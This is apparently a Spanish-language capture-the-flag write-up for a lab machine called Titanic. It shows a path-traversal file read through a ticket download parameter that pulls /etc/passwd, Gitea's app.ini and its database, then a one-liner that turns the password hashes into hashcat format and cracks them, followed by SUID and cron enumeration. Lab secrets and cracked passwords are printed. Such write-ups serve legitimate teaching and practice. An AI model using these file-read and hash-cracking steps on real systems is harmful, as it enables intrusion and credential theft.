<br>Nos descarga el siguiente archivo:  _etc_passwd<br><br>➜  nmap cat --plain ~/Descargas/_etc_passwd 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
developer:x:1000:1000:developer:/home/developer:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false

<br>Usuarios del sistema:<br>root:x:0:0:root:/root:/bin/bash
developer:x:1000:1000:developer:/home/developer:/bin/bash
<br><br>Sacamos el /etc/hosts del sistema mediante el LFI;<br>http://titanic.htb/download?ticket=/etc/hosts
<br>descubrimos el subdominio dev.titanic.htb; podriamos haberlo sacado por fuzzing facilmente<br>127.0.0.1 localhost titanic.htb dev.titanic.htb
127.0.1.1 titanic

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
<br><br>Lo anadimos a nuestro /etc/hosts:<br>10.10.11.55 titanic.htb dev.titanic.htb
<br>➜  ~ nikto --url http://dev.titanic.htb
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.11.55
+ Target Hostname:    dev.titanic.htb
+ Target Port:        80
+ Start Time:         2025-02-17 18:09:06 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.52 (Ubuntu)
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.52 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /v2/_catalog: Uncommon header 'docker-distribution-api-version' found, with contents: registry/2.0.
+ OPTIONS: Allowed HTTP Methods: ARRAY(0x55cdda20bb60) .
+ ERROR: Error limit (20) reached for host, giving up. Last error: 
+ Scan terminated: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2025-02-17 18:14:57 (GMT1) (351 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
<br><br>Nos encontramos con un Gitea:<br>
<img alt="Pasted image 20250217171840.png" src="machines/titanic/imgs/pasted-image-20250217171840.png"><br>➜  ~ whatweb http://dev.titanic.htb
http://dev.titanic.htb [200 OK] Apache[2.4.52], Cookies[_csrf,i_like_gitea], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], HttpOnly[_csrf,i_like_gitea], IP[10.10.11.55], Meta-Author[Gitea - Git with a cup of tea], Open-Graph-Protocol[website], PoweredBy[Gitea], Script, Title[Gitea: Git with a cup of tea], X-Frame-Options[SAMEORIGIN]
<br>encuentro la versión de gitea; la 1.22.1 mirando el source code; desgraciadamente no encuentro un exploit o alguna vulnerabilidad en esta versión; hay un XSS para la 1.22 que en esta versión esta parcheada; Vuln: <a rel="noopener nofollow" class="external-link" href="https://www.exploit-db.com/exploits/52077" target="_blank">https://www.exploit-db.com/exploits/52077</a><br>Nos registramos en Gitea y entramos en explore; http://dev.titanic.htb/explore/repos<br>
<img alt="Pasted image 20250217183141.png" src="machines/titanic/imgs/pasted-image-20250217183141.png"><br>
encontramos un par de repositorios de developer; les echamos un ojo<br>
<br>



<br><br><img alt="Pasted image 20250217183246.png" src="machines/titanic/imgs/pasted-image-20250217183246.png"><br>
Docker compose para la base de datos y su password;<br>version: '3.8'

services:
  mysql:
    image: mysql:8.0
    container_name: mysql
    ports:
      - "127.0.0.1:3306:3306"
    environment:
      MYSQL_ROOT_PASSWORD: 'MySQLP@$$w0rd!'
      MYSQL_DATABASE: tickets 
      MYSQL_USER: sql_svc
      MYSQL_PASSWORD: sql_password
    restart: always
<br>Vemos que la base de datos esta corriendo en el puerto 3306 pero no tenemos acceso de momento;<br><br>version: '3'

services:
  gitea:
    image: gitea/gitea
    container_name: gitea
    ports:
      - "127.0.0.1:3000:3000"
      - "127.0.0.1:2222:22"  # Optional for SSH access
    volumes:
      - /home/developer/gitea/data:/data # Replace with your path
    environment:
      - USER_UID=1000
      - USER_GID=1000
    restart: always
<br>Bueno tenemos ruta en local; el /data de gitea esta en /home/developer/gitea/data<br><br>Flask-app es el repositorio para la pagina web del booking de titanic<br>
<img alt="Pasted image 20250217183543.png" src="machines/titanic/imgs/pasted-image-20250217183543.png"><br><br>from flask import Flask, request, jsonify, send_file, render_template, redirect, url_for, Response
import os
import json
from uuid import uuid4

app = Flask(__name__)

TICKETS_DIR = "tickets"

if not os.path.exists(TICKETS_DIR):
    os.makedirs(TICKETS_DIR)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/book', methods=['POST'])
def book_ticket():
    data = {
        "name": request.form['name'],
        "email": request.form['email'],
        "phone": request.form['phone'],
        "date": request.form['date'],
        "cabin": request.form['cabin']
    }

    ticket_id = str(uuid4())
    json_filename = f"{ticket_id}.json"
    json_filepath = os.path.join(TICKETS_DIR, json_filename)

    with open(json_filepath, 'w') as json_file:
        json.dump(data, json_file)

    return redirect(url_for('download_ticket', ticket=json_filename))

@app.route('/download', methods=['GET'])
def download_ticket():
    ticket = request.args.get('ticket')
    if not ticket:
        return jsonify({"error": "Ticket parameter is required"}), 400

    json_filepath = os.path.join(TICKETS_DIR, ticket)

    if os.path.exists(json_filepath):
        return send_file(json_filepath, as_attachment=True, download_name=ticket)
    else:
        return jsonify({"error": "Ticket not found"}), 404

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000)
<br><br>A partir del Docker-compose de gitea creo uno en local para observar la estructura de archivos<br>─# docker exec -it f4a35e1a9c34 bash
f4a35e1a9c34:/# cd /data/
f4a35e1a9c34:/data# ls
git    gitea  ssh
f4a35e1a9c34:/data# tree .
.
├── git
├── gitea
│   ├── conf
│   │   └── app.ini
│   └── log
└── ssh
    ├── ssh_host_ecdsa_key
    ├── ssh_host_ecdsa_key.pub
    ├── ssh_host_ed25519_key
    ├── ssh_host_ed25519_key.pub
    ├── ssh_host_rsa_key
    └── ssh_host_rsa_key.pub

5 directories, 7 files
f4a35e1a9c34:/data# 

<br>Si el docker-compose esta corriendo en la maquina podriamos ser capaces de sacar archivos del gitea; probamos a sacar el app.ini en la ruta : /home/developer/gitea/data/gitea/conf/app.ini<br>Usamos el lfi <br>http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/conf/app.ini
<br>APP_NAME = Gitea: Git with a cup of tea
RUN_MODE = prod
RUN_USER = git
WORK_PATH = /data/gitea

[repository]
ROOT = /data/git/repositories

[repository.local]
LOCAL_COPY_PATH = /data/gitea/tmp/local-repo

[repository.upload]
TEMP_PATH = /data/gitea/uploads

[server]
APP_DATA_PATH = /data/gitea
DOMAIN = gitea.titanic.htb
SSH_DOMAIN = gitea.titanic.htb
HTTP_PORT = 3000
ROOT_URL = http://gitea.titanic.htb/
DISABLE_SSH = false
SSH_PORT = 22
SSH_LISTEN_PORT = 22
LFS_START_SERVER = true
LFS_JWT_SECRET = OqnUg-uJVK-l7rMN1oaR6oTF348gyr0QtkJt-JpjSO4
OFFLINE_MODE = true

[database]
PATH = /data/gitea/gitea.db
DB_TYPE = sqlite3
HOST = localhost:3306
NAME = gitea
USER = root
PASSWD = 
LOG_SQL = false
SCHEMA = 
SSL_MODE = disable

[indexer]
ISSUE_INDEXER_PATH = /data/gitea/indexers/issues.bleve

[session]
PROVIDER_CONFIG = /data/gitea/sessions
PROVIDER = file

[picture]
AVATAR_UPLOAD_PATH = /data/gitea/avatars
REPOSITORY_AVATAR_UPLOAD_PATH = /data/gitea/repo-avatars

[attachment]
PATH = /data/gitea/attachments

[log]
MODE = console
LEVEL = info
ROOT_PATH = /data/gitea/log

[security]
INSTALL_LOCK = true
SECRET_KEY = 
REVERSE_PROXY_LIMIT = 1
REVERSE_PROXY_TRUSTED_PROXIES = *
INTERNAL_TOKEN = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYmYiOjE3MjI1OTUzMzR9.X4rYDGhkWTZKFfnjgES5r2rFRpu_GXTdQ65456XC0X8
PASSWORD_HASH_ALGO = pbkdf2

[service]
DISABLE_REGISTRATION = false
REQUIRE_SIGNIN_VIEW = false
REGISTER_EMAIL_CONFIRM = false
ENABLE_NOTIFY_MAIL = false
ALLOW_ONLY_EXTERNAL_REGISTRATION = false
ENABLE_CAPTCHA = false
DEFAULT_KEEP_EMAIL_PRIVATE = false
DEFAULT_ALLOW_CREATE_ORGANIZATION = true
DEFAULT_ENABLE_TIMETRACKING = true
NO_REPLY_ADDRESS = noreply.localhost

[lfs]
PATH = /data/git/lfs

[mailer]
ENABLED = false

[openid]
ENABLE_OPENID_SIGNIN = true
ENABLE_OPENID_SIGNUP = true

[cron.update_checker]
ENABLED = false

[repository.pull-request]
DEFAULT_MERGE_STYLE = merge

[repository.signing]
DEFAULT_TRUST_MODEL = committer

[oauth2]
JWT_SECRET = FIAOKLQX4SBzvZ9eZnHYLTCiVGoBtkE4y5B7vMjzz3g

<br>Tenemos la ubicacion de la base de datos! <br>[database]
PATH = /data/gitea/gitea.db
<br>Usamos el lfi<br>http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db
<br>sqlite3 gitea.db 
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite&gt; .tables
access                     oauth2_grant             
access_token               org_user                 
action                     package                  
action_artifact            package_blob             
action_run                 package_blob_upload      
action_run_index           package_cleanup_rule     
action_run_job             package_file             
action_runner              package_property         
action_runner_token        package_version          
action_schedule            project                  
action_schedule_spec       project_board            
action_task                project_issue            
action_task_output         protected_branch         
action_task_step           protected_tag            
action_tasks_version       public_key               
action_variable            pull_auto_merge          
app_state                  pull_request             
attachment                 push_mirror              
auth_token                 reaction                 
badge                      release                  
branch                     renamed_branch           
collaboration              repo_archiver            
comment                    repo_indexer_status      
commit_status              repo_redirect            
commit_status_index        repo_topic               
commit_status_summary      repo_transfer            
dbfs_data                  repo_unit                
dbfs_meta                  repository               
deploy_key                 review                   
email_address              review_state             
email_hash                 secret                   
external_login_user        session                  
follow                     star                     
gpg_key                    stopwatch                
gpg_key_import             system_setting           
hook_task                  task                     
issue                      team                     
issue_assignees            team_invite              
issue_content_history      team_repo                
issue_dependency           team_unit                
issue_index                team_user                
issue_label                topic                    
issue_user                 tracked_time             
issue_watch                two_factor               
label                      upload                   
language_stat              user                     
lfs_lock                   user_badge               
lfs_meta_object            user_blocking            
login_source               user_open_id             
milestone                  user_redirect            
mirror                     user_setting             
notice                     version                  
notification               watch                    
oauth2_application         webauthn_credential      
oauth2_authorization_code  webhook                  
sqlite&gt; 
<br>Sacamos la tabla user;<br>
<img alt="Pasted image 20250217184713.png" src="machines/titanic/imgs/pasted-image-20250217184713.png"><br>sqlite&gt; PRAGMA table_info(user);
0|id|INTEGER|1||1
1|lower_name|TEXT|1||0
2|name|TEXT|1||0
3|full_name|TEXT|0||0
4|email|TEXT|1||0
5|keep_email_private|INTEGER|0||0
6|email_notifications_preference|TEXT|1|'enabled'|0
7|passwd|TEXT|1||0
8|passwd_hash_algo|TEXT|1|'argon2'|0
9|must_change_password|INTEGER|1|0|0
10|login_type|INTEGER|0||0
11|login_source|INTEGER|1|0|0
12|login_name|TEXT|0||0
13|type|INTEGER|0||0
14|location|TEXT|0||0
15|website|TEXT|0||0
16|rands|TEXT|0||0
17|salt|TEXT|0||0
18|language|TEXT|0||0
19|description|TEXT|0||0
20|created_unix|INTEGER|0||0
21|updated_unix|INTEGER|0||0
22|last_login_unix|INTEGER|0||0
23|last_repo_visibility|INTEGER|0||0
24|max_repo_creation|INTEGER|1|-1|0
25|is_active|INTEGER|0||0
26|is_admin|INTEGER|0||0
27|is_restricted|INTEGER|1|0|0
28|allow_git_hook|INTEGER|0||0
29|allow_import_local|INTEGER|0||0
30|allow_create_organization|INTEGER|0|1|0
31|prohibit_login|INTEGER|1|0|0
32|avatar|TEXT|1||0
33|avatar_email|TEXT|1||0
34|use_custom_avatar|INTEGER|0||0
35|num_followers|INTEGER|0||0
36|num_following|INTEGER|1|0|0
37|num_stars|INTEGER|0||0
38|num_repos|INTEGER|0||0
39|num_teams|INTEGER|0||0
40|num_members|INTEGER|0||0
41|visibility|INTEGER|1|0|0
42|repo_admin_change_team_access|INTEGER|1|0|0
43|diff_view_style|TEXT|1|''|0
44|theme|TEXT|1|''|0
45|keep_activity_private|INTEGER|1|0|0
sqlite&gt; PRAGMA table_info(user);
0|id|INTEGER|1||1
1|lower_name|TEXT|1||0
2|name|TEXT|1||0
3|full_name|TEXT|0||0
4|email|TEXT|1||0
5|keep_email_private|INTEGER|0||0
6|email_notifications_preference|TEXT|1|'enabled'|0
7|passwd|TEXT|1||0
8|passwd_hash_algo|TEXT|1|'argon2'|0
9|must_change_password|INTEGER|1|0|0
10|login_type|INTEGER|0||0
11|login_source|INTEGER|1|0|0
12|login_name|TEXT|0||0
13|type|INTEGER|0||0
14|location|TEXT|0||0
15|website|TEXT|0||0
16|rands|TEXT|0||0
17|salt|TEXT|0||0
18|language|TEXT|0||0
19|description|TEXT|0||0
20|created_unix|INTEGER|0||0
21|updated_unix|INTEGER|0||0
22|last_login_unix|INTEGER|0||0
23|last_repo_visibility|INTEGER|0||0
24|max_repo_creation|INTEGER|1|-1|0
25|is_active|INTEGER|0||0
26|is_admin|INTEGER|0||0
27|is_restricted|INTEGER|1|0|0
28|allow_git_hook|INTEGER|0||0
29|allow_import_local|INTEGER|0||0
30|allow_create_organization|INTEGER|0|1|0
31|prohibit_login|INTEGER|1|0|0
32|avatar|TEXT|1||0
33|avatar_email|TEXT|1||0
34|use_custom_avatar|INTEGER|0||0
35|num_followers|INTEGER|0||0
36|num_following|INTEGER|1|0|0
37|num_stars|INTEGER|0||0
38|num_repos|INTEGER|0||0
39|num_teams|INTEGER|0||0
40|num_members|INTEGER|0||0
41|visibility|INTEGER|1|0|0
42|repo_admin_change_team_access|INTEGER|1|0|0
43|diff_view_style|TEXT|1|''|0
44|theme|TEXT|1|''|0
45|keep_activity_private|INTEGER|1|0|0
sqlite&gt; select * from user;
1|administrator|administrator||root@titanic.htb|0|enabled|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|pbkdf2$50000$50|0|0|0||0|||70a5bd0c1a5d23caa49030172cdcabdc|2d149e5fbd1b20cf31db3e3c6a28fc9b|en-US||1722595379|1722597477|1722597477|0|-1|1|1|0|0|0|1|0|2e1e70639ac6b0eecbdab4a3d19e0f44|root@titanic.htb|0|0|0|0|0|0|0|0|0||gitea-auto|0
2|developer|developer||developer@titanic.htb|0|enabled|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|pbkdf2$50000$50|0|0|0||0|||0ce6f07fc9b557bc070fa7bef76a0d15|8bf3e3452b78544f8bee9400d6936d34|en-US||1722595646|1739811719|1739810910|1|-1|1|0|0|0|0|1|0|e2d95b7e207e432f62f3508be406c11b|developer@titanic.htb|0|0|0|0|4|0|0|0|0|unified|gitea-auto|0
3|test1|test1||test@xd.es|0|enabled|0e8d030d481c54a651a8cdb73c6fdb1b2900565ae1f7e95e9a943954fbf722565b76ed69fbae560a4bd55c1e75b9c5262900|pbkdf2$50000$50|0|0|0||0|||16220263a7a014a36bfc775908e2a1ac|fbbe897c5f7e2acc7e9662da1c6033f8|en-US||1739809739|1739814281|1739809739|0|-1|1|0|0|0|0|1|0|02ae5d68572414d3591b9fed657d41b2|test@xd.es|0|0|0|0|1|0|0|0|0|unified|gitea-auto|0
4|hahalol|hahalol||hahalol@gmail.com|0|enabled|f5cbd21458ebc24ae462926e851e21a953030e5f8bdc9f57633bb235b6944a08ae3e91036c8f7f13fd647edb942e3724b7b2|pbkdf2$50000$50|0|0|0||0|||4c43d3ea816ae4f8d0b095f993aad8bc|04c1e5c82ea5009599842f28ffa2b649|en-US||1739810105|1739812965|1739812965|0|-1|1|0|0|0|0|1|0|f1c8843f54a0e2794ea7538d408e0e91|hahalol@gmail.com|0|0|0|0|1|0|0|0|0||gitea-auto|0
5|hacker|hacker||hacker@gmail.com|0|enabled|2ce159ff197379b8598217f304fd62bf23553e51a12b30a50de4ecfc12add4214e88f2969edaa95be6b416eb659db8fb1f98|pbkdf2$50000$50|0|0|0||0|||5ca5776c7a616e8b19b67059de2d1b60|c7b686bac36b14f11712b6e027f73bb7|en-US||1739811981|1739812071|1739811981|0|-1|1|0|0|0|0|1|0|5f2e8c3605a2730d521d111a617aa968|hacker@gmail.com|0|0|0|0|1|0|0|0|0||gitea-auto|0
6|kali|kali||kali@kali.com|0|enabled|1cb922c696dee762c018ad606f8fd7eca87f9642809a3197c98eb661a5e74f1a4a49bed44ef9417d798b5cdb46064d0698bc|pbkdf2$50000$50|0|0|0||0|||be731a58906c441c4afe7e48bef44c7f|ccdee931405a2f5a1178661a185f64b6|en-US||1739812724|1739813242|1739812724|0|-1|1|0|0|0|0|1|0|951dc43cb482734c43d5f7f49dadcff0|kali@kali.com|0|0|0|0|1|0|0|0|0|unified|gitea-auto|0
7|tester|tester||tester@test.com|0|enabled|2a17317ce9211b8e4e44a75de69f017403528d30c0e6c0355ea9af7c350e19c6e1702a5cf90dc6652fc92cb2ac425231d79d|pbkdf2$50000$50|0|0|0||0|||6acd35897112b2862fb07ed947853558|ccf6419a6bc1132e547f5dd94057f124|en-US||1739813080|1739813081|1739813080|0|-1|1|0|0|0|0|1|0|0db53901eca1472a8997a38a24b38d06|tester@test.com|0|0|0|0|0|0|0|0|0||gitea-auto|0
8|cher0|cher0||none@mail.com|0|enabled|2f1bd1ee4c28629a3fdc8105c8fa3fa47972dc805531aa49b962b309ad7177e83b0506f22eb94873740565f1f434fd2d6d3b|pbkdf2$50000$50|0|0|0||0|||596dccd8ab821622a2a629dc7b5c2bc5|569a0839ffaa6c4a19489a5d1006cf12|en-US||1739813478|1739813900|1739813478|0|-1|1|0|0|0|0|1|0|12a1623f22ef4eec2da37b32549cb0ee|none@mail.com|0|0|0|0|0|0|0|0|0|unified|gitea-auto|0
sqlite&gt; 
<br><br><br>
<br>
Algoritmo de hashing :

<br>El campo passwd_hash_algo indica que el algoritmo utilizado es PBKDF2 .


<br>
Configuración del hash :

<br>Según el valor pbkdf2$50000$50:

<br>Iteraciones : 50,000.
<br>Longitud del hash : 50 bytes (en formato hexadecimal).
<br>Función hash subyacente : SHA-512 (implícito en PBKDF2).




<br>
Salt :

<br>El salt está almacenado en el campo salt. Por ejemplo:

<br>Para el usuario administrator: 70a5bd0c1a5d23caa49030172cdcabdc.
<br>Para el usuario developer: 0ce6f07fc9b557bc070fa7bef76a0d15.




<br>
Estructura del hash :

<br>El hash final (passwd) es el resultado de aplicar PBKDF2 sobre la contraseña original, utilizando el salt correspondiente y realizando 50,000 iteraciones. (esta jodida...)


<br>Script para sacar el hash de la base de datos;<br>sqlite3 gitea.db "select passwd,salt,name from user" | while read data; do digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); name=$(echo $data | cut -d'|' -f 3); echo "${name}:sha256:50000:${salt}:${digest}"; done | tee gitea.hashes
<br>administrator:sha256:50000:LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY=
developer:sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
test1:sha256:50000:+76JfF9+Ksx+lmLaHGAz+A==:Do0DDUgcVKZRqM23PG/bGykAVlrh9+lempQ5VPv3IlZbdu1p+65WCkvVXB51ucUmKQA=
hahalol:sha256:50000:BMHlyC6lAJWZhC8o/6K2SQ==:9cvSFFjrwkrkYpJuhR4hqVMDDl+L3J9XYzuyNbaUSgiuPpEDbI9/E/1kftuULjckt7I=
hacker:sha256:50000:x7aGusNrFPEXErbgJ/c7tw==:LOFZ/xlzebhZghfzBP1ivyNVPlGhKzClDeTs/BKt1CFOiPKWntqpW+a0Futlnbj7H5g=
kali:sha256:50000:zN7pMUBaL1oReGYaGF9ktg==:HLkixpbe52LAGK1gb4/X7Kh/lkKAmjGXyY62YaXnTxpKSb7UTvlBfXmLXNtGBk0GmLw=
tester:sha256:50000:zPZBmmvBEy5Uf13ZQFfxJA==:KhcxfOkhG45ORKdd5p8BdANSjTDA5sA1XqmvfDUOGcbhcCpc+Q3GZS/JLLKsQlIx150=
cher0:sha256:50000:VpoIOf+qbEoZSJpdEAbPEg==:LxvR7kwoYpo/3IEFyPo/pHly3IBVMapJuWKzCa1xd+g7BQbyLrlIc3QFZfH0NP0tbTs=
<br>hashcat:<br>hashcat gitea.hashes rockyou.txt --user
<br><br>developer:sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528
test1:sha256:50000:+76JfF9+Ksx+lmLaHGAz+A==:Do0DDUgcVKZRqM23PG/bGykAVlrh9+lempQ5VPv3IlZbdu1p+65WCkvVXB51ucUmKQA=:123456789
hacker:sha256:50000:x7aGusNrFPEXErbgJ/c7tw==:LOFZ/xlzebhZghfzBP1ivyNVPlGhKzClDeTs/BKt1CFOiPKWntqpW+a0Futlnbj7H5g=:12345678
kali:sha256:50000:zN7pMUBaL1oReGYaGF9ktg==:HLkixpbe52LAGK1gb4/X7Kh/lkKAmjGXyY62YaXnTxpKSb7UTvlBfXmLXNtGBk0GmLw=:password
cher0:sha256:50000:VpoIOf+qbEoZSJpdEAbPEg==:LxvR7kwoYpo/3IEFyPo/pHly3IBVMapJuWKzCa1xd+g7BQbyLrlIc3QFZfH0NP0tbTs=:12345678
]]></description><link>machines/titanic/1.recon.html</link><guid isPermaLink="false">Machines/Titanic/1.Recon.md</guid><pubDate>Mon, 17 Feb 2025 20:22:45 GMT</pubDate><enclosure url="machines/titanic/imgs/pasted-image-20250217165949.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;machines/titanic/imgs/pasted-image-20250217165949.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[2.PrivESC]]></title><description><![CDATA[ 
 <br>Nos logeamos como developer por ssh:<br><br><img alt="fuck.gif" src="machines/titanic/imgs/fuck.gif"> <img alt="fuck.gif" src="machines/titanic/imgs/fuck.gif"><br>
<img alt="Pasted image 20250217193814.png" src="machines/titanic/imgs/pasted-image-20250217193814.png"><br><br>developer@titanic:~$ ps -aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
develop+    1156 29.1  0.9 1066036 37312 ?       Ss   16:01  47:07 /usr/bin/python3 /opt/app/app.py
develop+    1767  1.4  6.6 1545764 262080 ?      Ssl  16:01   2:21 /usr/local/bin/gitea web
develop+    1843  0.0  0.2  17196  9648 ?        Ss   16:01   0:01 /lib/systemd/systemd --user
develop+    5666  0.0  0.1   8300  4240 ?        Ss   16:06   0:00 /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-act
develop+   50115  0.0  0.1   8788  5648 pts/4    Ss+  16:13   0:00 -bash
develop+  541766  0.0  0.1   8792  5628 pts/3    Ss+  16:54   0:00 -bash
develop+  825413  0.0  0.1   8812  5700 pts/1    Ss+  17:14   0:00 -bash
develop+  888111  0.0  0.1   8656  5416 pts/2    Ss+  17:19   0:00 -bash
develop+ 1211353  0.0  0.1   8788  5656 pts/6    Ss+  18:02   0:00 -bash
develop+ 1312515  0.0  0.1   8780  5560 pts/7    Ss+  18:17   0:00 -bash
develop+ 1428974  0.0  0.1   8788  5560 pts/0    Ss   18:29   0:00 -bash
develop+ 1432094  0.0  0.1   9196  5596 pts/8    Ss+  18:30   0:00 -bash
develop+ 1432162  0.0  0.1   8788  5600 pts/9    Ss+  18:30   0:00 -bash
develop+ 1530131  0.0  0.1   8656  5392 pts/10   Ss   18:38   0:00 -bash
develop+ 1553045 12.4  0.2 705804  9980 pts/0    Sl+  18:40   0:17 ./pspy64
develop+ 1564135  0.0  0.0  10336  3752 pts/10   R+   18:42   0:00 ps -aux
developer@titanic:~$ 

<br><br>Tenemos ahi el puerto 3000 (gitea) y el 5000 (titanic python webpage)<br>Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      1156/python3        
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:2222          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:43209         0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -           
<br><br>developer@titanic:~$ find / -perm /4000 2&gt;/dev/null
/snap/core20/2434/usr/bin/chfn
/snap/core20/2434/usr/bin/chsh
/snap/core20/2434/usr/bin/gpasswd
/snap/core20/2434/usr/bin/mount
/snap/core20/2434/usr/bin/newgrp
/snap/core20/2434/usr/bin/passwd
/snap/core20/2434/usr/bin/su
/snap/core20/2434/usr/bin/sudo
/snap/core20/2434/usr/bin/umount
/snap/core20/2434/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2434/usr/lib/openssh/ssh-keysign
/snap/snapd/23545/usr/lib/snapd/snap-confine
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/su
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/mount
/usr/bin/bash
/usr/bin/fusermount3
developer@titanic:~$ find / -perm /2000 2&gt;/dev/null
/snap/core20/2434/usr/bin/chage
/snap/core20/2434/usr/bin/expiry
/snap/core20/2434/usr/bin/ssh-agent
/snap/core20/2434/usr/sbin/pam_extrausers_chkpwd
/snap/core20/2434/usr/sbin/unix_chkpwd
/snap/core20/2434/var/mail
/var/log/journal
/var/log/journal/3010787ce58f43a9a8f1c8c49cb903e8
/var/local
/var/mail
/run/log/journal
/usr/local/share/fonts
/usr/sbin/unix_chkpwd
/usr/sbin/pam_extrausers_chkpwd
/usr/lib/x86_64-linux-gnu/utempter/utempter
/usr/bin/ssh-agent
/usr/bin/bash
/usr/bin/expiry
/usr/bin/crontab
/usr/bin/chage

<br><br>developer@titanic:/etc$ tree /etc/cron.d
/etc/cron.d
└── e2scrub_all

0 directories, 1 file
developer@titanic:/etc$ cat /etc/cron.d/e2scrub_all 
30 3 * * 0 root test -e /run/systemd/system || SERVICE_MODE=1 /usr/lib/x86_64-linux-gnu/e2fsprogs/e2scrub_all_cron
10 3 * * * root test -e /run/systemd/system || SERVICE_MODE=1 /sbin/e2scrub_all -A -r

